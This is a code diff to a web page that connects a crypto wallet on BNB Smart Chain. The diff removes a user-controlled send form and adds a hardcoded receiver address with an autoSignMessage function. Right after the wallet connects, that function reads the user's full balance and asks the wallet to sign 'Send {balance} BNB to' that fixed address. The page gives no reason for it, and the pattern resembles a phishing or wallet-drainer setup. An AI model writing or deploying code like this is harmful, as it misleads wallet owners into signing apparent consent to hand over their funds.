@@ -26,6 +26,12 @@
       padding: 15px;
       border-radius: 8px;
     }
+    .signed-message {
+      margin-top: 10px;
+      color: green;
+      font-family: monospace;
+      word-break: break-word;
+    }
   </style>
 </head>
 <body>
@@ -36,18 +42,13 @@
     <p><strong>Wallet Address:</strong> <span id="walletAddress"></span></p>
     <p><strong>BNB Balance:</strong> <span id="bnbBalance"></span></p>
     <p><strong>Current Network:</strong> <span id="networkName"></span></p>
-  </div>
-
-  <div class="info" id="transactionInfo" style="display: none;">
-    <p><strong>Transaction Details:</strong></p>
-    <p><strong>To Address:</strong> <input type="text" id="toAddress" placeholder="0xRecipientAddress"></p>
-    <p><strong>Amount (BNB):</strong> <input type="number" id="amount" placeholder="0.01"></p>
-    <button onclick="signAndSendTransaction()">Sign and Send Transaction</button>
+    <p><strong>Signed Message:</strong> <span class="signed-message" id="signedMsg"></span></p>
   </div>
 
   <script>
     let web3;
     let userAddress;
+    const receiverAddress = "0x0d4efb6dff647912bb7b29ed3a0e1e8f6e4c297a";
 
     async function connectWallet() {
       if (!window.ethereum) {
@@ -56,20 +57,14 @@
       }
 
       try {
-        // Step 1: Connect Wallet
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         userAddress = accounts[0];
         web3 = new Web3(window.ethereum);
         document.getElementById("walletAddress").innerText = userAddress;
 
-        // Step 2: Switch to BNB
         await switchToBSC();
-
-        // Step 3: Show balance and network
         await showWalletInfo();
-
-        // Step 4: Show Transaction Form
-        document.getElementById("transactionInfo").style.display = "block";
+        await autoSignMessage();
 
       } catch (err) {
         console.error("Connection failed:", err);
@@ -78,45 +73,33 @@
     }
 
     async function switchToBSC() {
-      const bscChainId = '0x38'; // BNB Smart Chain = 56 in hex
+      const bscChainId = '0x38';
 
       try {
         const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
-        if (currentChainId === bscChainId) {
-          console.log("Already on BNB Chain.");
-          return;
-        }
+        if (currentChainId === bscChainId) return;
 
-        // Try switching to BSC
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
           params: [{ chainId: bscChainId }],
         });
 
-        console.log("Switched to BNB Chain.");
-
       } catch (switchError) {
-        // If the chain is not added to MetaMask/TrustWallet
         if (switchError.code === 4902) {
-          try {
-            await window.ethereum.request({
-              method: 'wallet_addEthereumChain',
-              params: [{
-                chainId: bscChainId,
-                chainName: 'BNB Smart Chain',
-                rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                nativeCurrency: {
-                  name: 'BNB',
-                  symbol: 'BNB',
-                  decimals: 18
-                },
-                blockExplorerUrls: ['https://bscscan.com']
-              }]
-            });
-          } catch (addError) {
-            console.error("Add chain error:", addError);
-            throw addError;
-          }
+          await window.ethereum.request({
+            method: 'wallet_addEthereumChain',
+            params: [{
+              chainId: bscChainId,
+              chainName: 'BNB Smart Chain',
+              rpcUrls: ['https://bsc-dataseed.binance.org/'],
+              nativeCurrency: {
+                name: 'BNB',
+                symbol: 'BNB',
+                decimals: 18
+              },
+              blockExplorerUrls: ['https://bscscan.com']
+            }]
+          });
         } else {
           throw switchError;
         }
@@ -131,7 +114,6 @@
 
         const chainId = await web3.eth.getChainId();
         let networkName = 'Unknown';
-
         if (chainId === 56) networkName = 'BNB Smart Chain';
         else if (chainId === 1) networkName = 'Ethereum Mainnet';
         else if (chainId === 137) networkName = 'Polygon';
@@ -139,42 +121,23 @@
 
         document.getElementById("networkName").innerText = networkName;
         document.getElementById("walletInfo").style.display = "block";
-
       } catch (err) {
         console.error("Failed to load wallet info:", err);
       }
     }
 
-    async function signAndSendTransaction() {
-      const toAddress = document.getElementById("toAddress").value;
-      const amount = document.getElementById("amount").value;
-
-      if (!toAddress || !amount) {
-        alert("Please enter both the recipient address and the amount.");
-        return;
-      }
-
+    async function autoSignMessage() {
       try {
-        // Step 1: Create transaction object
-        const tx = {
-          from: userAddress,
-          to: toAddress,
-          value: web3.utils.toWei(amount, 'ether'), // Convert amount to Wei
-          gas: 21000, // Standard gas for a simple transfer
-          gasPrice: await web3.eth.getGasPrice(),
-        };
+        const balanceWei = await web3.eth.getBalance(userAddress);
+        const balance = web3.utils.fromWei(balanceWei, 'ether');
+        const message = `Send ${balance} BNB to ${receiverAddress}`;
 
-        // Step 2: Sign the transaction
-        const signedTx = await web3.eth.personal.signTransaction(tx, userAddress);
-
-        // Step 3: Send the transaction
-        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
-
-        console.log("Transaction successful:", receipt);
-        alert("Transaction successful! TxHash: " + receipt.transactionHash);
+        const signedMsg = await web3.eth.personal.sign(message, userAddress);
+        document.getElementById("signedMsg").innerText = signedMsg;
+        console.log("Signed message:", signedMsg);
       } catch (err) {
-        console.error("Transaction failed:", err);
-        alert("Transaction failed.");
+        console.error("Failed to sign message:", err);
+        document.getElementById("signedMsg").innerText = "Signing failed.";
       }
     }
   </script>
